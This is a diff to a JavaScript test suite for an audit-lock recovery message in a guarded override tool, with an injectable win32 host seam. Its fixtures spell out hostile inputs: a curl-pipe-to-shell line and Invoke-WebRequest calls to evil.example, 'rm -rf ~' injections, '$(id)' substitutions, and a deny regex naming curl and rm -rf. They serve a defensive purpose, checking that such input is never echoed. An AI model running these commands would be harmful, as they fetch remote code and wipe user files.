@@ -4238,6 +4238,189 @@ test("the rendered reason is bounded to typed tokens against any outcome shape",
 });
 
 // ---------------------------------------------------------------------------------
+// T90-T2 (Ruling 125, Critic T90 F1/F2): the typed audit-lock recovery must reach a human.
+// humanGuardRouteUnavailableReason is the one renderer behind guard-testpath, guard-gate-strength
+// and lib/guard/denial-route; today it prints the code and nothing else, so a wedged win32
+// audit lock is a bare "HGO-AUDIT-LOCK-AMBIGUOUS" with no way out. Ruling 125 binds the cure:
+// for code HGO-AUDIT-LOCK-AMBIGUOUS with a well-formed error.recovery the renderer adds ONE
+// fixed line, re-validates recovery.files, and re-renders the command from the validated
+// files instead of echoing recovery.command (which keeps the renderer's injection bound).
+//
+// State of each case, committed against 58a30b844:
+//   well-formed -> ONE extra line (every platform, and the host default)  RED
+//   hostile command, valid files -> rebuilt line, command never echoed    RED (presence half)
+//   hostile command never echoed (absence half only)                      green today
+//   malformed files / recovery -> exactly today's two lines               green today
+//   recovery on any other code -> exactly today's two lines               green today
+//
+// ASSUMPTIONS the ruling's prose does not fix, named so the fix slice can match them (a
+// deliberate reading, not a requirement; if the fix reads the ruling differently, the Critic
+// rules and these pins change):
+//   R1. Placement. The recovery line is appended as a THIRD line after today's two lines,
+//       joined with "\n"; the first two lines are byte-identical to today's text.
+//   R2. Platform. The renderer cannot see which platform the lock fixture is for, so the pins
+//       inject it as a THIRD ARGUMENT `{ platform }` (default: process.platform). It selects
+//       the delete verb and the win32 clause. A host-default case omits the argument.
+//   R3. Wording, pinned as substrings only: the precondition verbatim ("only after confirming
+//       that no other Pipeline session is running an override ceremony"), the word "attended"
+//       (case-insensitive), and for platform "win32" the phrase "may still be live". Nothing
+//       is pinned about the other platforms' absence of that phrase.
+//   R4. Command. Rebuilt from the validated files in the shape ambiguousAuditLockRefusal
+//       uses: non-win32 `rm -- '<file>'`, win32 `Remove-Item -LiteralPath '<file>'`, each
+//       file single-quoted verbatim. One command for all files or one per file is not pinned.
+//   R5. Validity of an entry in recovery.files: a forward-slash repository-relative path of
+//       the form `.git/agent-pipeline/human-guard-overrides/<name>` where <name> is a short
+//       run of [A-Za-z0-9._-] (the real names are `audit.lock` and `audit.lock.recover`).
+//       The malformed list below (absolute, `..`, outside the directory, control character,
+//       shell metacharacter, over-long) is each rejected; ONE bad entry rejects the whole
+//       recovery (fails closed to today's text).
+//   R6. Relative form. ambiguousAuditLockRefusal (lib :2441) emits the ABSOLUTE lock path today
+//       (`paths.auditLock`); under R5 that real error would itself render no line. The fix
+//       slice must emit (or derive) the repository-relative form; the pins here build the
+//       error with the relative form by hand and say nothing about how production derives it.
+// ---------------------------------------------------------------------------------
+{
+  const CODE = "HGO-AUDIT-LOCK-AMBIGUOUS";
+  const STORE = ".git/agent-pipeline/human-guard-overrides";
+  const LOCK = `${STORE}/audit.lock`;
+  const RECOVER = `${STORE}/audit.lock.recover`;
+  const TODAY = "No human override route is offered for this exact command; the guard attempted to plan one.\n"
+    + `Reason: planning the route failed with code=${CODE}.`;
+  const PRECONDITION = "only after confirming that no other Pipeline session is running an override ceremony";
+
+  function ambiguous(recovery, code = CODE) {
+    const error = new HumanGuardOverrideError(code, "audit lock owner state is ambiguous");
+    if (recovery !== undefined) error.recovery = recovery;
+    return error;
+  }
+
+  // The third argument is omitted entirely for the host default, so a renderer that ignores
+  // it is judged by the same call shape as today's.
+  function render(recovery, options, code = CODE) {
+    return options === undefined
+      ? humanGuardRouteUnavailableReason("command", { error: ambiguous(recovery, code) })
+      : humanGuardRouteUnavailableReason("command", { error: ambiguous(recovery, code) }, options);
+  }
+
+  function assertOneRecoveryLine(rendered, files, label) {
+    const lines = rendered.split("\n");
+    assert.equal(lines.length, 3,
+      `${label}: a well-formed ${CODE} recovery must render ONE extra line after today's two, but the output has ${lines.length} line(s): ${JSON.stringify(rendered)}`);
+    assert.equal(lines.slice(0, 2).join("\n"), TODAY, `${label}: the first two lines must stay byte-identical to today's text`);
+    for (const file of files) {
+      assert.ok(lines[2].includes(`'${file}'`), `${label}: the recovery line must name the lock ${file} (single-quoted): ${JSON.stringify(lines[2])}`);
+    }
+    assert.ok(lines[2].includes(PRECONDITION), `${label}: the recovery line must state the precondition verbatim: ${JSON.stringify(lines[2])}`);
+    assert.match(lines[2], /attended/iu, `${label}: the recovery line must mark the deletion as attended`);
+    return lines[2];
+  }
+
+  test("T90-T2 (v): a well-formed audit-lock recovery renders ONE extra line naming the lock, an attended delete and its precondition", () => {
+    for (const files of [[LOCK], [RECOVER], [LOCK, RECOVER]]) {
+      const recovery = { files, command: "ignored: the renderer rebuilds the command" };
+      const posix = assertOneRecoveryLine(render(recovery, { platform: "linux" }), files, `(v) linux ${files.join("+")}`);
+      assert.ok(posix.includes("rm -- "), `(v) linux ${files.join("+")}: the delete command must use rm --: ${JSON.stringify(posix)}`);
+      const windows = assertOneRecoveryLine(render(recovery, { platform: "win32" }), files, `(v) win32 ${files.join("+")}`);
+      assert.ok(windows.includes("Remove-Item -LiteralPath "), `(v) win32 ${files.join("+")}: the delete command must use Remove-Item -LiteralPath: ${JSON.stringify(windows)}`);
+      assert.match(windows, /may still be live/u, `(v) win32 ${files.join("+")}: the line must say the owner may still be live`);
+    }
+  });
+
+  test("T90-T2 (v): the host default (no platform argument) renders the same one-line recovery", () => {
+    const files = [LOCK];
+    const line = assertOneRecoveryLine(render({ files, command: "ignored" }), files, "(v) host default");
+    if (process.platform === "win32") {
+      assert.ok(line.includes("Remove-Item -LiteralPath "), `(v) host default on win32: expected Remove-Item -LiteralPath: ${JSON.stringify(line)}`);
+      assert.match(line, /may still be live/u, "(v) host default on win32: the line must say the owner may still be live");
+    } else {
+      assert.ok(line.includes("rm -- "), `(v) host default: expected rm --: ${JSON.stringify(line)}`);
+    }
+  });
+
+  test("T90-T2 (v): a malformed recovery.files renders NO recovery line, exactly today's two lines", () => {
+    const malformed = [
+      ["an absolute posix path", [`/home/someone/repo/${LOCK}`]],
+      ["an absolute windows path", ["C:\\Users\\someone\\repo\\.git\\agent-pipeline\\human-guard-overrides\\audit.lock"]],
+      ["an absolute windows path with forward slashes", [`C:/Users/someone/repo/${LOCK}`]],
+      ["a .. segment that stays inside the store", [`${STORE}/../human-guard-overrides/audit.lock`]],
+      ["a .. segment that escapes the store", [`${STORE}/../../config`]],
+      ["a path outside the store directory", [".git/config"]],
+      ["a sibling directory sharing the store prefix", [".git/agent-pipeline/human-guard-overrides-other/audit.lock"]],
+      ["the parent directory", [".git/agent-pipeline/audit.lock"]],
+      ["a bare name", ["audit.lock"]],
+      ["the store directory itself", [`${STORE}/`]],
+      ["a newline", [`${LOCK}\nrm -rf ~`]],
+      ["a carriage return", [`${LOCK}\r`]],
+      ["a NUL byte", [`${LOCK}\u0000`]],
+      ["a shell metacharacter", [`${LOCK}; rm -rf ~`]],
+      ["a single quote", [`${STORE}/audit'lock`]],
+      ["a space", [`${STORE}/audit lock`]],
+      ["a command substitution", [`${STORE}/$(id)`]],
+      ["an over-long value", [`${STORE}/${"a".repeat(5000)}`]],
+      ["one bad entry beside a good one", [LOCK, `${STORE}/../../config`]],
+      ["a non-string entry", [42]],
+      ["a null entry", [null]],
+      ["an empty list", []],
+      ["a string instead of a list", LOCK],
+      ["no files key", { command: `rm -- '${LOCK}'` }],
+      ["a null recovery", null],
+      ["a string recovery", `rm -- '${LOCK}'`],
+    ];
+    for (const [label, recoveryOrFiles] of malformed) {
+      const recovery = Array.isArray(recoveryOrFiles) || typeof recoveryOrFiles === "string" && label !== "a string recovery"
+        ? { files: recoveryOrFiles, command: "rm -- x" }
+        : recoveryOrFiles;
+      for (const options of [undefined, { platform: "linux" }, { platform: "win32" }]) {
+        assert.equal(render(recovery, options), TODAY,
+          `(v) ${label}${options ? ` (platform ${options.platform})` : ""}: a malformed recovery must render exactly today's two lines`);
+      }
+    }
+  });
+
+  test("T90-T2 (v): a recovery on any other code renders no recovery line", () => {
+    const recovery = { files: [LOCK], command: `rm -- '${LOCK}'` };
+    for (const code of ["HGO-AUDIT-LOCKED", "HGO-AUDIT-LOCK-MALFORMED", "HGO-AUDIT"]) {
+      assert.equal(
+        render(recovery, { platform: "linux" }, code),
+        `No human override route is offered for this exact command; the guard attempted to plan one.\nReason: planning the route failed with code=${code}.`,
+        `(v) ${code}: only ${CODE} carries a rendered recovery`,
+      );
+    }
+  });
+
+  test("T90-T2 (v): a hostile recovery.command is never echoed", () => {
+    const hostile = [
+      `rm -- '${LOCK}'; rm -rf ~`,
+      `rm -- '${LOCK}'\nrm -rf ~`,
+      "$(curl https://evil.example/x | sh)",
+      "`curl https://evil.example/x`",
+      `Remove-Item -LiteralPath '${LOCK}'; Invoke-WebRequest https://evil.example/x`,
+    ];
+    for (const command of hostile) {
+      for (const options of [undefined, { platform: "linux" }, { platform: "win32" }]) {
+        const rendered = render({ files: [LOCK], command }, options);
+        assert.doesNotMatch(rendered, /rm -rf|curl|evil\.example|Invoke-WebRequest|\$\(|`/u,
+          `(v) hostile command ${JSON.stringify(command)}: nothing of it may reach the rendered text: ${JSON.stringify(rendered)}`);
+        assert.ok(rendered.split("\n").length <= 3, `(v) hostile command ${JSON.stringify(command)}: at most one extra line`);
+        // With malformed files the same command must not rescue a line either.
+        assert.equal(render({ files: [`/etc/passwd`], command }, options), TODAY,
+          `(v) hostile command with malformed files ${JSON.stringify(command)}: exactly today's two lines`);
+      }
+    }
+  });
+
+  test("T90-T2 (v): a hostile recovery.command changes nothing: the line is rebuilt from the validated files", () => {
+    const benign = render({ files: [LOCK], command: `rm -- '${LOCK}'` }, { platform: "linux" });
+    assertOneRecoveryLine(benign, [LOCK], "(v) benign command");
+    for (const command of [`rm -- '${LOCK}'; rm -rf ~`, `rm -- x\nrm -rf ~`, "$(id)", `Remove-Item -LiteralPath 'elsewhere'`]) {
+      const rendered = render({ files: [LOCK], command }, { platform: "linux" });
+      assert.equal(rendered, benign,
+        `(v) command ${JSON.stringify(command)}: the rendered text must not depend on recovery.command at all`);
+    }
+  });
+}
+
+// ---------------------------------------------------------------------------------
 // ADR-0059 Decision 6 (2026-08-08): eligibility() gains a new, honestly-scoped
 // "cross-repository-target" class for a target that genuinely escapes the physical
 // project root (dispatch HGOELIG-1). guard-lifecycle-ready.mjs (a separate file, out of
@@ -5890,26 +6073,32 @@ test("concurrentWorktreeAdvisory() never throws: a failing spawn reports checked
 // files from the pinned list in harness/scripts/verify.mjs, which names this file
 // ("human-guard-override-tests") and would not run a new one.
 //
-// SEAM: none. auditLockOwnerState(record) and localAuditLockOwner() take no parameters and
-// read process.platform, hostname() and /proc directly; neither is exported, and
-// acquireAuditLock's `dependencies` carries only publish/recovery hook callbacks. So pins
-// (a)-(d) can only run against a real win32 host and are skipped everywhere else. T90-F must
-// add the missing seam: an injectable { platform, hostname, bootId/uptime, pidAlive } on
-// auditLockOwnerState/localAuditLockOwner (threaded through acquireAuditLock's
-// `dependencies`), after which (a)-(d) should be re-pinned to run on every host.
+// SEAM: dependencies.auditLockHost (T90-F, 58a30b844). acquireAuditLock(paths, secret,
+// dependencies) threads an optional { platform, hostname, bootId, uptimeSeconds, nowMs,
+// pidAlive } through resolveAuditLockHost() into every owner verdict and into the owner the
+// lock records (seam doc comment above resolveAuditLockHost in the module). With nothing
+// injected the host is the real machine. Pins (a)-(d2) inject a win32 host, so they run on
+// EVERY host. Linux hosting an injected platform "win32" is supported; the reverse (injecting
+// "linux" on a host without /proc) is not, which is why (L) stays a real-Linux case. The one
+// real-host variant at the end of the block needs a native win32 machine and is skipped
+// elsewhere with that reason; /proc is the only other host requirement, for (L).
 //
-// Pin matrix, with the state each pin is committed in:
-//   (a)  win32, same host, owner pid gone                     -> reclaimed   RED on win32 today
-//   (a2) the same for an abandoned recovery guard (:2400)     -> cleared     RED on win32 today
-//   (b)  legacy record (bootId "unavailable"), pid gone       -> reclaimed   RED on win32 today
-//   (c)  pid alive, recorded boot time differs from local     -> reclaimed   RED on win32 today
-//   (d1) pid alive, recorded boot time equals local           -> AMBIGUOUS   green (unchanged)
-//   (d2) pid alive, bootId "unavailable"                      -> AMBIGUOUS   green (unchanged)
+// Pin matrix, with the state each pin is committed in (T90-T2, against 58a30b844):
+//   (a)  win32, same host, owner pid gone                     -> reclaimed   green (seam, every host)
+//   (a2) the same for an abandoned recovery guard (:2400)     -> cleared     green (seam, every host)
+//   (b)  legacy record (bootId "unavailable"), pid gone       -> reclaimed   green (seam, every host)
+//   (c)  pid alive, recorded boot time differs from local     -> reclaimed   green (seam, every host)
+//   (d1) pid alive, recorded boot time equals local           -> AMBIGUOUS   green (seam, every host)
+//   (d2) pid alive, bootId "unavailable"                      -> AMBIGUOUS   green (seam, every host)
 //   (e)  foreign host (every host)                            -> AMBIGUOUS   green (unchanged)
-//   (f)  every AMBIGUOUS refusal carries error.recovery       -> typed      RED on every host
+//   (f)  every AMBIGUOUS refusal carries error.recovery       -> typed       green (T90-F)
 //   (L)  Linux control: dead owner reclaimed, live refused    -> unchanged   green on Linux
+//   (ii) tolerance boundary: 1 minute apart AMBIGUOUS, 2 apart dead         green (seam)
+//   (iii) a malformed injected seam -> HGO-AUDIT-LOCK-MALFORMED             green (seam)
+//   (seam) an injected host decides the recorded owner                      green (seam)
+//   (real host) native win32, no injection: gone pid dead, live pid + local boot time ambiguous
 //
-// ASSUMPTIONS the briefing/ruling do not fix (named here so T90-F and the Critic can see them):
+// ASSUMPTIONS the briefing/ruling do not fix (named here so the Critic can see them):
 //   1. Refusal shape. HumanGuardOverrideError carries only `code` and `message` today. Pin (f)
 //      therefore fixes a NEW own property named `recovery` with exactly the keys
 //      { files, command }: `files` is a non-empty array of strings that includes the exact
@@ -5917,18 +6106,19 @@ test("concurrentWorktreeAdvisory() never throws: a failing spawn reports checked
 //      paths.auditLockRecovery for an abandoned recovery guard), and `command` is a non-empty
 //      string for an attended operator. The verb of the command is deliberately not pinned.
 //   2. win32 boot-time encoding. Ruling 111 fixes "a coarse boot time in the bootId field" but
-//      not its textual format or its tolerance. (c) therefore records the literal decimal
-//      string "1" (a boot time no clock can call equal to the real one, valid under SAFE_ID,
-//      and not the legacy marker "unavailable"). (d1) takes the "matching" value from a real
-//      acquisition on the same host instead of computing it, retried up to 3 times so a
-//      minute-boundary crossing between two reads cannot make it flaky. Before T90-F lands,
-//      the local bootId is still "unavailable", so (d1) and (d2) coincide; they diverge once
-//      a real boot time is recorded.
-//   3. (a) keeps the locally recorded bootId and only kills the pid; (b) forces the legacy
-//      marker. They overlap until T90-F records a real boot time, which is intended: (b)
-//      isolates the pid-gone rule from any boot-time comparison.
-//   4. Platform of the planted record is always the host's own (win32 on win32, linux on
-//      linux); a cross-platform record is out of scope for Ruling 111.
+//      not its textual format or its tolerance. The seam derives it as the decimal string of
+//      floor((nowMs - uptimeSeconds * 1000) / 60000); nowMs is injected, so (d1) is exact
+//      with no retry. (c) records the literal "1" (a boot time far from the seam's, valid
+//      under SAFE_ID, and not the legacy marker "unavailable").
+//   3. (a) keeps the seam's own recorded boot minute and only the pid probe says "gone"; (b)
+//      forces the legacy marker. (b) isolates the pid-gone rule from any boot-time comparison.
+//   4. Platform of the planted record is always the injected host's own platform; a
+//      cross-platform record is ambiguous on every host and is out of scope for Ruling 111.
+//   5. Tolerance. Ruling 111 says a differing boot time is dead; T90-F implements "differs by
+//      MORE THAN WIN32_BOOT_MINUTE_TOLERANCE (1) minute" so a live owner whose boot time sits
+//      on a minute edge is never stolen from. (ii) pins that reading: 1 apart ambiguous, 2 apart
+//      dead, in both directions. If the Critic rules for the literal ruling, (ii) is the pin
+//      that changes.
 //
 // Fixture. Temp directories only; the real .git/agent-pipeline/human-guard-overrides/ store
 // and any live lock are never touched. A lock record is HMAC'd, so each fixture publishes a
@@ -5943,9 +6133,35 @@ test("concurrentWorktreeAdvisory() never throws: a failing spawn reports checked
   const { acquireAuditLock, releaseOwnedAuditLock } = humanGuardOverrideInternals;
   const canonicalJson = humanGuardOverrideInternals.canonical;
 
-  const WIN32_ONLY = process.platform === "win32"
+  const WIN32_REAL_HOST_ONLY = process.platform === "win32"
     ? false
-    : "needs a native win32 host: auditLockOwnerState has no platform/pid/uptime injection seam (T90-F adds it)";
+    : "real-host variant: it runs the default host with no injected seam, so it needs a native win32 machine; the seam-injected cases (a)-(d2) pin the same rules on every host";
+
+  // The injected win32 host the T90-T2 pins run against. Every member is fixed, so no pin
+  // depends on the real clock, hostname or process table.
+  const SEAM_HOSTNAME = "t90-seam-host";
+  const SEAM_NOW_MS = 1_800_000_030_000;
+  const SEAM_UPTIME_SECONDS = 7_200;
+  // floor((1_800_000_030_000 - 7_200 * 1000) / 60_000), written out so no pin leans on the
+  // module's own arithmetic (the instant sits 30 s into a minute, far from either edge).
+  const SEAM_BOOT_MINUTE = 29_999_880;
+  const GONE_PID = 4_194_001;
+
+  function seamHost(overrides = {}) {
+    return {
+      platform: "win32",
+      hostname: SEAM_HOSTNAME,
+      nowMs: SEAM_NOW_MS,
+      uptimeSeconds: SEAM_UPTIME_SECONDS,
+      pidAlive: () => true,
+      ...overrides,
+    };
+  }
+
+  /** acquireAuditLock `dependencies` that stand in for the injected win32 host. */
+  function seamed(overrides = {}) {
+    return { auditLockHost: seamHost(overrides) };
+  }
   const LINUX_ONLY = process.platform === "linux"
     ? false
     : "Linux control: needs /proc on a Linux host";
@@ -5995,9 +6211,9 @@ test("concurrentWorktreeAdvisory() never throws: a failing spawn reports checked
 
   // Publish a real lock, then rewrite it in place with the owner patched and a valid MAC.
   // target "auditLockRecovery" moves the rewritten record to the recovery-guard path.
-  function plantLock(box, { target = "auditLock", ownerPatch = {} }) {
+  function plantLock(box, { target = "auditLock", ownerPatch = {}, dependencies = {} }) {
     const purpose = target === "auditLockRecovery" ? "recovery" : "existing";
-    const live = acquireAuditLock(box.paths, SECRET, { purpose: "existing" });
+    const live = acquireAuditLock(box.paths, SECRET, { ...dependencies, purpose: "existing" });
     const owner = { ...live.record.owner, ...ownerPatch };
     const core = { schema: live.record.schema, purpose, owner };
     const record = { ...core, mac: createHmac("sha256", SECRET).update(canonicalJson(core)).digest("hex") };
@@ -6014,9 +6230,9 @@ test("concurrentWorktreeAdvisory() never throws: a failing spawn reports checked
     } finally { box.cleanup(); }
   }
 
-  function attempt(box) {
+  function attempt(box, dependencies = {}) {
     try {
-      const lock = acquireAuditLock(box.paths, SECRET);
+      const lock = acquireAuditLock(box.paths, SECRET, dependencies);
       return { ok: true, lock, recovered: lock.recovered === true };
     } catch (error) {
       return { ok: false, code: error?.code, error };
@@ -6033,8 +6249,8 @@ test("concurrentWorktreeAdvisory() never throws: a failing spawn reports checked
     if (result.ok) releaseOwnedAuditLock(result.lock);
   }
 
-  function expectReclaimed(box, label) {
-    const result = attempt(box);
+  function expectReclaimed(box, label, dependencies = {}) {
+    const result = attempt(box, dependencies);
     try {
       assert.equal(result.ok && result.recovered, true,
         `${label}: expected the dead owner's lock to be reclaimed (recovered: true), but ${outcomeText(result)}`);
@@ -6042,8 +6258,8 @@ test("concurrentWorktreeAdvisory() never throws: a failing spawn reports checked
     } finally { releaseIfHeld(result); }
   }
 
-  function expectAmbiguous(box, label, { keepPath }) {
-    const result = attempt(box);
+  function expectAmbiguous(box, label, { keepPath }, dependencies = {}) {
+    const result = attempt(box, dependencies);
     try {
       assert.equal(result.ok, false, `${label}: expected an ambiguous refusal, but ${outcomeText(result)}`);
       assert.ok(result.error instanceof HumanGuardOverrideError, `${label}: expected a HumanGuardOverrideError`);
@@ -6053,19 +6269,27 @@ test("concurrentWorktreeAdvisory() never throws: a failing spawn reports checked
     return result;
   }
 
-  test("T90-T (a): win32 same-host owner whose pid is gone is dead, so the stale lock is reclaimed", { skip: WIN32_ONLY }, () => {
+  // (a)-(d2), (ii) and (iii) run on every host: the planted record and the verdict both go
+  // through the injected win32 host (`seamed()`), so nothing here reads the real platform,
+  // clock, hostname or process table. The pid probe is injected too; GONE_PID is never a real
+  // process, and the probe records which pid it was asked about.
+  test("T90-T (a): win32 same-host owner whose pid is gone is dead, so the stale lock is reclaimed", () => {
     const box = sandbox();
     try {
-      plantLock(box, { ownerPatch: { pid: deadPid() } });
-      expectReclaimed(box, "(a) dead pid, locally recorded boot time");
+      plantLock(box, { ownerPatch: { pid: GONE_PID }, dependencies: seamed() });
+      const probed = [];
+      expectReclaimed(box, "(a) dead pid, locally recorded boot time",
+        seamed({ pidAlive: (pid) => { probed.push(pid); return false; } }));
+      assert.ok(probed.length > 0 && probed.every((pid) => pid === GONE_PID),
+        `(a) the injected pid probe must be asked about the owner's pid ${GONE_PID}, but it saw ${JSON.stringify(probed)}`);
     } finally { box.cleanup(); }
   });
 
-  test("T90-T (a2): win32 abandoned recovery guard whose owner pid is gone is cleared (:2400)", { skip: WIN32_ONLY }, () => {
+  test("T90-T (a2): win32 abandoned recovery guard whose owner pid is gone is cleared (:2400)", () => {
     const box = sandbox();
     try {
-      plantLock(box, { target: "auditLockRecovery", ownerPatch: { pid: deadPid() } });
-      const result = attempt(box);
+      plantLock(box, { target: "auditLockRecovery", ownerPatch: { pid: GONE_PID }, dependencies: seamed() });
+      const result = attempt(box, seamed({ pidAlive: () => false }));
       try {
         assert.equal(result.ok, true,
           `(a2) expected the dead recovery guard to be cleared and the lock acquired, but ${outcomeText(result)}`);
@@ -6075,23 +6299,137 @@ test("concurrentWorktreeAdvisory() never throws: a failing spawn reports checked
     } finally { box.cleanup(); }
   });
 
-  test("T90-T (b): a legacy win32 record (bootId unavailable) with a dead pid is dead", { skip: WIN32_ONLY }, () => {
+  test("T90-T (b): a legacy win32 record (bootId unavailable) with a dead pid is dead", () => {
     const box = sandbox();
     try {
-      plantLock(box, { ownerPatch: { pid: deadPid(), bootId: "unavailable", processStart: "unavailable" } });
-      expectReclaimed(box, "(b) legacy bootId, dead pid");
+      plantLock(box, {
+        ownerPatch: { pid: GONE_PID, bootId: "unavailable", processStart: "unavailable" },
+        dependencies: seamed(),
+      });
+      expectReclaimed(box, "(b) legacy bootId, dead pid", seamed({ pidAlive: () => false }));
     } finally { box.cleanup(); }
   });
 
-  test("T90-T (c): win32 owner with a live pid but a different recorded boot time is dead", { skip: WIN32_ONLY }, () => {
+  test("T90-T (c): win32 owner with a live pid but a different recorded boot time is dead", () => {
     const box = sandbox();
     try {
-      plantLock(box, { ownerPatch: { pid: process.pid, bootId: "1" } });
-      expectReclaimed(box, "(c) live pid, different boot time");
+      plantLock(box, { ownerPatch: { pid: process.pid, bootId: "1" }, dependencies: seamed() });
+      expectReclaimed(box, "(c) live pid, different boot time", seamed({ pidAlive: () => true }));
     } finally { box.cleanup(); }
   });
 
-  test("T90-T (d1): win32 owner with a live pid and the local boot time stays ambiguous", { skip: WIN32_ONLY }, () => {
+  test("T90-T (d1): win32 owner with a live pid and the local boot time stays ambiguous", () => {
+    const box = sandbox();
+    try {
+      plantLock(box, {
+        ownerPatch: { pid: process.pid, bootId: String(SEAM_BOOT_MINUTE) },
+        dependencies: seamed(),
+      });
+      expectAmbiguous(box, "(d1) live pid, local boot time", { keepPath: box.paths.auditLock }, seamed({ pidAlive: () => true }));
+    } finally { box.cleanup(); }
+  });
+
+  test("T90-T (d2): win32 owner with a live pid and bootId unavailable stays ambiguous", () => {
+    const box = sandbox();
+    try {
+      plantLock(box, {
+        ownerPatch: { pid: process.pid, bootId: "unavailable", processStart: "unavailable" },
+        dependencies: seamed(),
+      });
+      expectAmbiguous(box, "(d2) live pid, legacy bootId", { keepPath: box.paths.auditLock }, seamed({ pidAlive: () => true }));
+    } finally { box.cleanup(); }
+  });
+
+  test("T90-T2 (ii): the win32 boot-minute tolerance boundary: one minute apart is ambiguous, two minutes apart is dead", () => {
+    // WIN32_BOOT_MINUTE_TOLERANCE is 1: adjacent minutes count as the same boot (the estimate
+    // wobbles by about a second), a gap of two minutes is a different boot. Both directions.
+    const cases = [
+      { delta: -1, verdict: "ambiguous" },
+      { delta: 1, verdict: "ambiguous" },
+      { delta: -2, verdict: "dead" },
+      { delta: 2, verdict: "dead" },
+    ];
+    for (const { delta, verdict } of cases) {
+      const box = sandbox();
+      try {
+        const recorded = String(SEAM_BOOT_MINUTE + delta);
+        const label = `(ii) recorded boot minute ${delta > 0 ? "+" : ""}${delta} from the local one (${recorded})`;
+        plantLock(box, { ownerPatch: { pid: process.pid, bootId: recorded }, dependencies: seamed() });
+        if (verdict === "dead") expectReclaimed(box, label, seamed({ pidAlive: () => true }));
+        else expectAmbiguous(box, label, { keepPath: box.paths.auditLock }, seamed({ pidAlive: () => true }));
+      } finally { box.cleanup(); }
+    }
+  });
+
+  test("T90-T2 (iii): a malformed injected host seam is refused with HGO-AUDIT-LOCK-MALFORMED before any lock is touched", () => {
+    const malformed = [
+      ["a string", "nope"],
+      ["a number", 42],
+      ["null", null],
+      ["a boolean", true],
+      ["an array", []],
+      ["a numeric platform", { platform: 5 }],
+      ["a numeric hostname", { hostname: 1 }],
+      ["a numeric bootId", { bootId: 7 }],
+      ["a string uptimeSeconds", { uptimeSeconds: "1" }],
+      ["a string nowMs", { nowMs: "1" }],
+      ["a non-function pidAlive", { pidAlive: 1 }],
+    ];
+    for (const [label, seam] of malformed) {
+      const box = sandbox();
+      try {
+        assert.throws(
+          () => acquireAuditLock(box.paths, SECRET, { auditLockHost: seam }),
+          (error) => error instanceof HumanGuardOverrideError && error.code === "HGO-AUDIT-LOCK-MALFORMED",
+          `(iii) ${label}: expected HGO-AUDIT-LOCK-MALFORMED`,
+        );
+        assert.equal(existsSync(box.paths.auditLock), false, `(iii) ${label}: a refused seam must publish no lock`);
+      } finally { box.cleanup(); }
+    }
+  });
+
+  test("T90-T2 (seam): an injected host decides the owner the lock records", () => {
+    const box = sandbox();
+    try {
+      assert.equal(Math.floor((SEAM_NOW_MS - SEAM_UPTIME_SECONDS * 1000) / 60000), SEAM_BOOT_MINUTE,
+        "precondition: the written-out boot minute must match the seam's nowMs and uptimeSeconds");
+      const derived = acquireAuditLock(box.paths, SECRET, seamed({ hostname: "T90-Seam-HOST" }));
+      try {
+        assert.deepEqual(
+          { ...derived.record.owner, nonce: undefined },
+          {
+            platform: "win32",
+            hostId: SEAM_HOSTNAME,
+            bootId: String(SEAM_BOOT_MINUTE),
+            pid: process.pid,
+            processStart: "unavailable",
+            nonce: undefined,
+          },
+          "the owner must come from the injected host: platform, lower-cased hostname, boot minute from nowMs and uptimeSeconds",
+        );
+      } finally { releaseOwnedAuditLock(derived); }
+      const explicit = acquireAuditLock(box.paths, SECRET, seamed({ bootId: " AbC123 " }));
+      try {
+        assert.equal(explicit.record.owner.bootId, "abc123", "an injected bootId wins over the uptime derivation, trimmed and lower-cased");
+      } finally { releaseOwnedAuditLock(explicit); }
+    } finally { box.cleanup(); }
+  });
+
+  test("T90-T2 (real host): on native win32 the default host classifies a gone pid dead and a live pid with the local boot time ambiguous", { skip: WIN32_REAL_HOST_ONLY }, () => {
+    // No seam is injected: this is the one case that exercises the real process.kill probe and
+    // the real uptime-derived boot minute, which the injected cases above cannot.
+    const gone = sandbox();
+    try {
+      plantLock(gone, { ownerPatch: { pid: deadPid() } });
+      expectReclaimed(gone, "(real host) dead pid");
+    } finally { gone.cleanup(); }
+
+    const differing = sandbox();
+    try {
+      plantLock(differing, { ownerPatch: { pid: process.pid, bootId: "1" } });
+      expectReclaimed(differing, "(real host) live pid, different boot time");
+    } finally { differing.cleanup(); }
+
     for (let round = 0; round < 3; round += 1) {
       const before = localBootId();
       const box = sandbox();
@@ -6103,19 +6441,11 @@ test("concurrentWorktreeAdvisory() never throws: a failing spawn reports checked
       } finally { box.cleanup(); }
       // A coarse boot time can tick over between two reads; only judge a round whose premise held.
       if (localBootId() !== before) continue;
-      assert.equal(result.ok, false, `(d1) expected an ambiguous refusal, but ${outcomeText(result)}`);
-      assert.equal(result.code, AMBIGUOUS, `(d1) expected ${AMBIGUOUS}, but ${outcomeText(result)}`);
+      assert.equal(result.ok, false, `(real host) expected an ambiguous refusal, but ${outcomeText(result)}`);
+      assert.equal(result.code, AMBIGUOUS, `(real host) expected ${AMBIGUOUS}, but ${outcomeText(result)}`);
       return;
     }
-    assert.fail("(d1) the local boot time changed in every one of 3 rounds, so no round could be judged");
-  });
-
-  test("T90-T (d2): win32 owner with a live pid and bootId unavailable stays ambiguous", { skip: WIN32_ONLY }, () => {
-    const box = sandbox();
-    try {
-      plantLock(box, { ownerPatch: { pid: process.pid, bootId: "unavailable", processStart: "unavailable" } });
-      expectAmbiguous(box, "(d2) live pid, legacy bootId", { keepPath: box.paths.auditLock });
-    } finally { box.cleanup(); }
+    assert.fail("(real host) the local boot time changed in every one of 3 rounds, so no round could be judged");
   });
 
   test("T90-T (e): a foreign-host owner stays ambiguous even with a dead pid and a different boot time", () => {
